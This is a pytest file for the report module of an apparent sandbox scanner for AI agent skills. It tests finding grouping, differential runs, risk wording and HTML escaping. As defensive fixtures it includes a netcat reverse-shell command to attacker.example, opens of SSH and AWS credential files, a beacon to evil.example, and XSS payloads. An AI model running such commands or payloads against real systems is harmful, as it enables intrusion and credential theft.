"""Regression coverage for sentinel.report's scoring/grouping behavior."""

import json
from pathlib import Path

from sentinel.findings import Confidence, Finding, Severity
from sentinel.report import (
    Report,
    build_report,
    collection_risk,
    diff_sandbox_results,
    render_html,
    render_html_multi,
    render_json,
    render_markdown,
    render_markdown_multi,
    risk_guidance,
    sandbox_result_findings,
    sandbox_result_signature,
)
from sentinel.sandbox import HttpFlow, SandboxRunResult, StraceEvent
from sentinel.skillmd import SkillMetadata


def _openat_event(path: str) -> StraceEvent:
    return StraceEvent(
        pid="1",
        timestamp="00:00:00.000000",
        syscall="openat",
        raw_args=f'AT_FDCWD, "{path}", O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0666',
        result="3",
    )


def test_many_opens_under_one_directory_collapse_to_one_finding():
    # Regression test: a self-installer copying its own N bundled files to
    # ~/.claude/skills/<name>/ emitted one HIGH finding per file — found
    # inflating a real skill's score to 23719 (3388 near-identical findings)
    # during the launch scan, dwarfing genuinely severe findings like a single
    # hidden_executable (score 15).
    events = [
        _openat_event(f"/root/.claude/skills/my-skill/scripts/file{i}.py") for i in range(10)
    ]
    result = SandboxRunResult(
        invocation="python3 install.py",
        exit_code=0,
        timed_out=False,
        strace_events=events,
        dns_queries=[],
        http_flows=[],
    )

    findings = sandbox_result_findings(result)
    file_findings = [f for f in findings if f.category == "out_of_scope_file_access"]
    assert len(file_findings) == 1
    assert "10 files" in file_findings[0].summary


def test_repeated_identical_network_requests_collapse_to_one_finding():
    # Regression test: pip retrying the same blocked URL after the sandbox's
    # network sinkhole emitted one HIGH network_request finding per retry — found
    # contributing 42 of 77 points on a real skill (alanl1234/
    # xiaohongshu-matrices-cli) during the launch scan for a single install
    # attempt, not 6 distinct destinations.
    flows = [
        HttpFlow(kind="http_request", host="pypi.org", port=443, method="GET", path="/simple/foo/")
        for _ in range(6)
    ]
    result = SandboxRunResult(
        invocation="sh scripts/install.sh",
        exit_code=0,
        timed_out=False,
        strace_events=[],
        dns_queries=[],
        http_flows=flows,
    )

    findings = sandbox_result_findings(result)
    net_findings = [f for f in findings if f.category == "network_request"]
    assert len(net_findings) == 1
    assert "6x" in net_findings[0].summary


def test_a_couple_of_scattered_opens_stay_individual():
    events = [_openat_event("/root/.ssh/id_rsa"), _openat_event("/root/.aws/credentials")]
    result = SandboxRunResult(
        invocation="python3 main.py",
        exit_code=0,
        timed_out=False,
        strace_events=events,
        dns_queries=[],
        http_flows=[],
    )

    findings = sandbox_result_findings(result)
    file_findings = [f for f in findings if f.category == "out_of_scope_file_access"]
    assert len(file_findings) == 2


def _execve_event(path: str, argv: list) -> StraceEvent:
    argv_str = ", ".join(f'"{a}"' for a in argv)
    return StraceEvent(
        pid="1",
        timestamp="00:00:00.000000",
        syscall="execve",
        raw_args=f'"{path}", [{argv_str}], 0x7fff0000 /* 14 vars */',
        result="0",
    )


def test_unexpected_subprocess_spawn_becomes_a_finding():
    events = [
        _execve_event("/usr/bin/sh", ["sh", "-c", "python3 scripts/format.py"]),
        _execve_event("/usr/local/bin/python3", ["python3", "scripts/format.py"]),
        _execve_event("/usr/bin/nc", ["nc", "-e", "/bin/sh", "attacker.example", "4444"]),
    ]
    result = SandboxRunResult(
        invocation="python3 scripts/format.py",
        exit_code=0,
        timed_out=False,
        strace_events=events,
        dns_queries=[],
        http_flows=[],
    )

    findings = sandbox_result_findings(result)
    spawn_findings = [f for f in findings if f.category == "unexpected_subprocess"]
    assert len(spawn_findings) == 1
    assert "nc" in spawn_findings[0].summary
    assert spawn_findings[0].severity == Severity.MEDIUM


def test_declared_invocation_and_wrapper_never_become_findings():
    events = [
        _execve_event("/usr/bin/sh", ["sh", "-c", "python3 scripts/format.py"]),
        _execve_event("/usr/local/bin/python3", ["python3", "scripts/format.py"]),
    ]
    result = SandboxRunResult(
        invocation="python3 scripts/format.py",
        exit_code=0,
        timed_out=False,
        strace_events=events,
        dns_queries=[],
        http_flows=[],
    )

    findings = sandbox_result_findings(result)
    assert [f for f in findings if f.category == "unexpected_subprocess"] == []


def test_many_spawns_of_the_same_command_collapse_to_one_finding():
    events = [
        _execve_event("/usr/bin/sh", ["sh", "-c", "python3 scripts/build.py"]),
        _execve_event("/usr/local/bin/python3", ["python3", "scripts/build.py"]),
    ] + [_execve_event("/usr/bin/gcc", ["gcc", f"file{i}.c"]) for i in range(5)]
    result = SandboxRunResult(
        invocation="python3 scripts/build.py",
        exit_code=0,
        timed_out=False,
        strace_events=events,
        dns_queries=[],
        http_flows=[],
    )

    findings = sandbox_result_findings(result)
    spawn_findings = [f for f in findings if f.category == "unexpected_subprocess"]
    assert len(spawn_findings) == 1
    assert "5x" in spawn_findings[0].summary


def _sandbox_result(invocation: str, events=None, flows=None) -> SandboxRunResult:
    return SandboxRunResult(
        invocation=invocation,
        exit_code=0,
        timed_out=False,
        strace_events=events or [],
        dns_queries=[],
        http_flows=flows or [],
    )


def test_sandbox_result_signature_ignores_pid_and_timestamp_noise():
    # Two runs of the same deterministic skill get different PIDs/timestamps
    # from strace every time. The signature must not treat that as a real
    # behavioral difference, or --differential would false-positive on every scan.
    events_a = [_execve_event("/usr/bin/sh", ["sh", "-c", "python3 x.py"])]
    events_b = [_execve_event("/usr/bin/sh", ["sh", "-c", "python3 x.py"])]
    result_a = _sandbox_result("python3 x.py", events=events_a)
    result_b = _sandbox_result("python3 x.py", events=events_b)
    assert sandbox_result_signature(result_a) == sandbox_result_signature(result_b)


def test_diff_sandbox_results_flags_behavior_only_in_varied_run():
    baseline = _sandbox_result("python3 x.py")
    varied = _sandbox_result(
        "python3 x.py",
        flows=[HttpFlow(kind="http_request", host="evil.example", port=443, method="GET", path="/beacon")],
    )
    findings = diff_sandbox_results(baseline, varied)
    assert len(findings) == 1
    assert findings[0].category == "differential_behavior_change"
    assert "varied" in findings[0].summary
    assert "evil.example" in findings[0].summary


def test_diff_sandbox_results_flags_behavior_only_in_baseline_run():
    baseline = _sandbox_result(
        "python3 x.py",
        flows=[HttpFlow(kind="http_request", host="evil.example", port=443, method="GET", path="/beacon")],
    )
    varied = _sandbox_result("python3 x.py")
    findings = diff_sandbox_results(baseline, varied)
    assert len(findings) == 1
    assert "default sandbox conditions, not when" in findings[0].summary


def test_diff_sandbox_results_distinguishes_same_command_different_args():
    # Regression test: a real live run showed subprocess.run(["echo", "a"]) in
    # both runs and subprocess.run(["echo", "b"]) only in the varied run being
    # missed entirely, because the signature was keyed on command name alone
    # ("echo" in both), not on which arguments it was actually called with.
    wrapper_and_invocation = [
        _execve_event("/usr/bin/sh", ["sh", "-c", "python3 x.py"]),
        _execve_event("/usr/bin/python3", ["python3", "x.py"]),
    ]
    baseline = _sandbox_result(
        "python3 x.py",
        events=wrapper_and_invocation + [_execve_event("/usr/bin/echo", ["echo", "always-happens"])],
    )
    varied = _sandbox_result(
        "python3 x.py",
        events=wrapper_and_invocation
        + [
            _execve_event("/usr/bin/echo", ["echo", "always-happens"]),
            _execve_event("/usr/bin/echo", ["echo", "only-when-varied"]),
        ],
    )
    findings = diff_sandbox_results(baseline, varied)
    assert len(findings) == 1
    assert "only-when-varied" in findings[0].summary


def test_diff_sandbox_results_no_findings_when_identical():
    flows = [HttpFlow(kind="http_request", host="api.example", port=443, method="GET", path="/data")]
    baseline = _sandbox_result("python3 x.py", flows=flows)
    varied = _sandbox_result("python3 x.py", flows=list(flows))
    assert diff_sandbox_results(baseline, varied) == []


def _clean_report(name: str = "clean-skill") -> Report:
    return Report(
        skill_path=f"/tmp/{name}",
        skill_name=name,
        skill_description="A totally normal skill.",
        findings=[],
        risk_score=0,
        risk_level=Severity.LOW,
        invocations=["python3 main.py"],
    )


def test_render_html_is_well_formed_and_shows_clean_state():
    output = render_html(_clean_report())
    assert output.startswith("<!doctype html>")
    assert output.rstrip().endswith("</html>")
    assert "clean-skill" in output
    assert "LOW" in output
    assert "None found" in output  # static red flags empty state
    assert "Not run" in output  # semantic review not run, default False


def test_render_html_escapes_adversarial_finding_content():
    # Regression guard: everything embedded here (skill names, finding
    # summaries/details/sources) ultimately comes from a scanned skill's own,
    # potentially adversarial, content. A malicious skill naming itself
    # "<script>alert(1)</script>" must not become live markup in the very
    # report meant to warn about it.
    report = Report(
        skill_path="/tmp/evil",
        skill_name="<script>alert(1)</script>",
        skill_description=None,
        findings=[
            Finding(
                category="out_of_scope_file_access",
                severity=Severity.HIGH,
                summary='<img src=x onerror=alert(1)>',
                detail="<b>bold detail</b>",
                source="<i>source</i>",
            )
        ],
        risk_score=7,
        risk_level=Severity.HIGH,
        invocations=[],
    )
    output = render_html(report)
    assert "<script>alert(1)</script>" not in output
    assert "<img src=x onerror=alert(1)>" not in output
    assert "&lt;script&gt;" in output
    assert "&lt;img src=x onerror=alert(1)&gt;" in output


def test_render_html_multi_collapses_to_single_report():
    assert render_html_multi([_clean_report()]) == render_html(_clean_report())


def test_render_html_multi_shows_summary_table_and_per_skill_sections():
    reports = [_clean_report("skill-a"), _clean_report("skill-b")]
    output = render_html_multi(reports)
    assert "2 skills" in output
    assert '<table class="summary">' in output
    assert output.count("<details") == 2
    assert "skill-a" in output
    assert "skill-b" in output


def _risky_report(name: str, severity: Severity, score: int) -> Report:
    return Report(
        skill_path=f"/tmp/{name}",
        skill_name=name,
        skill_description=None,
        findings=[Finding(category="network_request", severity=severity, summary="x")],
        risk_score=score,
        risk_level=severity,
        invocations=[],
    )


def test_collection_risk_picks_the_single_riskiest_skill():
    # Sum-across-skills would scale with collection size rather than with how
    # bad any one skill actually is - the worst single skill should win, not
    # some inflated aggregate over dozens/hundreds of harmless skills.
    reports = [_clean_report("safe-one"), _risky_report("dangerous-one", Severity.CRITICAL, 30), _clean_report("safe-two")]
    worst = collection_risk(reports)
    assert worst.skill_name == "dangerous-one"


def test_render_markdown_multi_shows_overall_risk_and_guidance():
    dangerous = _risky_report("dangerous-skill", Severity.CRITICAL, 30)
    reports = [_clean_report("safe-skill"), dangerous]
    output = render_markdown_multi(reports)
    assert "**Overall risk score:** 30 (CRITICAL, driven by dangerous-skill)" in output
    assert risk_guidance(dangerous) in output


def test_render_html_multi_shows_overall_risk_badge():
    dangerous = _risky_report("dangerous-skill", Severity.CRITICAL, 30)
    reports = [_clean_report("safe-skill"), dangerous]
    output = render_html_multi(reports)
    assert "Overall: CRITICAL (30), driven by dangerous-skill" in output
    assert risk_guidance(dangerous) in output


def test_risk_guidance_names_flagged_categories_and_gives_a_verdict():
    report = _risky_report("dangerous-skill", Severity.CRITICAL, 30)
    guidance = risk_guidance(report)
    assert "unexpected outbound network requests" in guidance
    assert "do not use this skill" in guidance


def test_risk_guidance_clean_report_says_safe_to_use():
    assert "safe to use" in risk_guidance(_clean_report())


def test_risk_guidance_diagnostic_only_report_does_not_read_as_a_finding():
    # sandbox_not_attempted is a coverage gap ("we don't have data"), not
    # something the skill actually did - must not read as "Flagged for X"
    # the same way a real finding does.
    report = Report(
        skill_path="/tmp/no-candidate",
        skill_name="no-candidate",
        skill_description=None,
        findings=[
            Finding(
                category="sandbox_not_attempted",
                severity=Severity.MEDIUM,
                summary="No invocable candidate found",
            )
        ],
        risk_score=3,
        risk_level=Severity.MEDIUM,
        invocations=[],
    )
    guidance = risk_guidance(report)
    assert "Flagged for" not in guidance
    assert "No malicious behavior found" in guidance
    # Must read as confident, not as the tool hedging on its own result.
    assert "incomplete" not in guidance
    # sandbox_not_attempted only ever fires on a full (non-static) scan where
    # the sandbox was attempted but had nothing invocable to run — must not
    # claim the scan was --static, which would be false.
    assert "static" not in guidance.lower()
    assert "no bundled script" in guidance
    assert "treat this" not in guidance.lower()


def test_risk_guidance_gives_a_distinct_explanation_per_diagnostic_category():
    # Each diagnostic category means something different (no candidate to run
    # vs. a timeout vs. a broken trace) — must not collapse to one interchangeable
    # blanket phrase regardless of which one actually happened.
    timeout_report = Report(
        skill_path="/tmp/timeout",
        skill_name="timeout",
        skill_description=None,
        findings=[Finding(category="sandbox_timeout", severity=Severity.MEDIUM, summary="x")],
        risk_score=3,
        risk_level=Severity.MEDIUM,
        invocations=[],
    )
    guidance = risk_guidance(timeout_report)
    assert "didn't finish within the timeout" in guidance
    assert "no bundled script" not in guidance


def test_risk_guidance_mixes_diagnostic_and_real_findings_lists_only_real_ones():
    report = Report(
        skill_path="/tmp/mixed",
        skill_name="mixed",
        skill_description=None,
        findings=[
            Finding(category="sandbox_not_attempted", severity=Severity.MEDIUM, summary="x"),
            Finding(category="hidden_executable", severity=Severity.CRITICAL, summary="x"),
        ],
        risk_score=18,
        risk_level=Severity.CRITICAL,
        invocations=[],
    )
    guidance = risk_guidance(report)
    assert "Flagged for a hidden executable file" in guidance
    assert "no dynamic behavior observed" not in guidance


def test_risk_guidance_caps_listed_categories():
    categories = [
        "base64_blob",
        "eval_exec_decode",
        "hidden_executable",
        "out_of_scope_file_access",
        "unexpected_subprocess",
    ]
    report = Report(
        skill_path="/tmp/many-flags",
        skill_name="many-flags",
        skill_description=None,
        findings=[Finding(category=c, severity=Severity.MEDIUM, summary="x") for c in categories],
        risk_score=15,
        risk_level=Severity.MEDIUM,
        invocations=[],
    )
    guidance = risk_guidance(report)
    assert "1 more" in guidance


def _metadata(name: str = "test-skill", allowed_tools=None) -> SkillMetadata:
    return SkillMetadata(
        name=name,
        description="A test skill.",
        license=None,
        allowed_tools=allowed_tools,
        when_to_use=None,
        paths=None,
        raw_frontmatter={},
        body="",
        path=Path(f"/tmp/{name}"),
    )


def test_finding_to_dict_includes_confidence_and_mitre_technique():
    explicit = Finding(
        category="hidden_executable",
        severity=Severity.CRITICAL,
        summary="x",
        confidence=Confidence.HIGH,
        mitre_technique="T1564.001",
    )
    assert explicit.to_dict()["confidence"] == "high"
    assert explicit.to_dict()["mitre_technique"] == "T1564.001"

    defaulted = Finding(category="unmapped", severity=Severity.LOW, summary="x")
    assert defaulted.to_dict()["confidence"] == "medium"
    assert defaulted.to_dict()["mitre_technique"] == ""


def test_build_report_applies_confidence_and_mitre_by_category():
    findings = [
        Finding(category="base64_blob", severity=Severity.MEDIUM, summary="a"),
        Finding(category="hidden_executable", severity=Severity.CRITICAL, summary="b"),
        Finding(category="totally_unmapped_category", severity=Severity.LOW, summary="c"),
    ]
    report = build_report(Path("/tmp/skill"), _metadata(), findings, None, [])
    by_category = {f.category: f for f in report.findings}

    assert by_category["base64_blob"].confidence == Confidence.MEDIUM
    assert by_category["base64_blob"].mitre_technique == "T1027"
    assert by_category["hidden_executable"].confidence == Confidence.HIGH
    assert by_category["hidden_executable"].mitre_technique == "T1564.001"
    assert by_category["totally_unmapped_category"].confidence == Confidence.MEDIUM
    assert by_category["totally_unmapped_category"].mitre_technique == ""


def test_render_markdown_shows_confidence_and_mitre_technique():
    findings = [Finding(category="eval_exec_decode", severity=Severity.HIGH, summary="decoded exec")]
    report = build_report(Path("/tmp/skill"), _metadata(), findings, None, [])
    output = render_markdown(report)
    assert "confidence: high" in output
    assert "ATT&CK T1140" in output


def test_render_html_shows_confidence_and_omits_empty_mitre_technique():
    findings = [
        Finding(category="eval_exec_decode", severity=Severity.HIGH, summary="decoded exec"),
        Finding(category="tls_handshake_failed", severity=Severity.MEDIUM, summary="handshake failed"),
    ]
    report = build_report(Path("/tmp/skill"), _metadata(), findings, None, [])
    output = render_html(report)
    assert "confidence: high" in output
    assert "confidence: medium" in output
    assert output.count("ATT&amp;CK") == 1


def test_render_json_includes_confidence_and_mitre_technique():
    findings = [Finding(category="network_request", severity=Severity.HIGH, summary="GET https://evil.example/x")]
    report = build_report(Path("/tmp/skill"), _metadata(), findings, None, [])
    data = json.loads(render_json(report))
    finding = data["findings"][0]
    assert finding["confidence"] == "high"
    assert finding["mitre_technique"] == "T1041"


def test_markdown_labels_unchecked_sections_when_sandbox_did_not_run():
    report = build_report(Path("/tmp/skill"), _metadata(), [], None, [], sandbox_ran=False)
    output = render_markdown(report)
    assert output.count("Not checked (--static).") == 3
    assert "No network activity observed." not in output
    assert "Nothing unusual observed." not in output


def test_markdown_shows_clean_state_when_sandbox_ran_and_found_nothing():
    report = build_report(Path("/tmp/skill"), _metadata(), [], None, [], sandbox_ran=True)
    output = render_markdown(report)
    assert "No network activity observed." in output
    assert "Nothing unusual observed." in output
    assert "Not checked (--static)." not in output


def test_html_labels_unchecked_sections_when_sandbox_did_not_run():
    report = build_report(Path("/tmp/skill"), _metadata(), [], None, [], sandbox_ran=False)
    output = render_html(report)
    assert output.count("Not checked (--static).") == 3


def test_sandbox_not_attempted_finding_appears_under_subprocess_section():
    findings = [
        Finding(
            category="sandbox_not_attempted",
            severity=Severity.MEDIUM,
            summary="no invocable candidate found",
            source="sandbox",
        )
    ]
    report = build_report(Path("/tmp/skill"), _metadata(), findings, None, [], sandbox_ran=True)
    output = render_markdown(report)
    subprocess_section = output.split("## Subprocess / execution")[1].split("##")[0]
    assert "no invocable candidate found" in subprocess_section


def test_allowed_tools_surfaced_in_report_and_json():
    report = build_report(Path("/tmp/skill"), _metadata(allowed_tools=["Bash", "Read"]), [], None, [])
    assert report.allowed_tools == ["Bash", "Read"]

    markdown = render_markdown(report)
    assert "`Bash`" in markdown and "`Read`" in markdown

    data = json.loads(render_json(report))
    assert data["allowed_tools"] == ["Bash", "Read"]


def test_allowed_tools_absent_shows_none_declared():
    report = build_report(Path("/tmp/skill"), _metadata(allowed_tools=None), [], None, [])
    assert report.allowed_tools == []
    assert "(none declared)" in render_markdown(report)
    assert "(none declared)" in render_html(report)


def test_frontmatter_broad_tool_grant_gets_confidence_and_mitre():
    findings = [Finding(category="frontmatter_broad_tool_grant", severity=Severity.MEDIUM, summary="x")]
    report = build_report(Path("/tmp/skill"), _metadata(), findings, None, [])
    finding = report.findings[0]
    assert finding.confidence == Confidence.MEDIUM
    assert finding.mitre_technique == "T1059"


def test_frontmatter_broad_tool_grant_renders_under_static_red_flags():
    findings = [
        Finding(
            category="frontmatter_broad_tool_grant",
            severity=Severity.MEDIUM,
            summary="unscoped Bash grant",
            source="SKILL.md",
        )
    ]
    report = build_report(Path("/tmp/skill"), _metadata(), findings, None, [])

    markdown = render_markdown(report)
    static_section = markdown.split("## Static red flags")[1].split("##")[0]
    assert "unscoped Bash grant" in static_section

    html_output = render_html(report)
    assert "unscoped Bash grant" in html_output
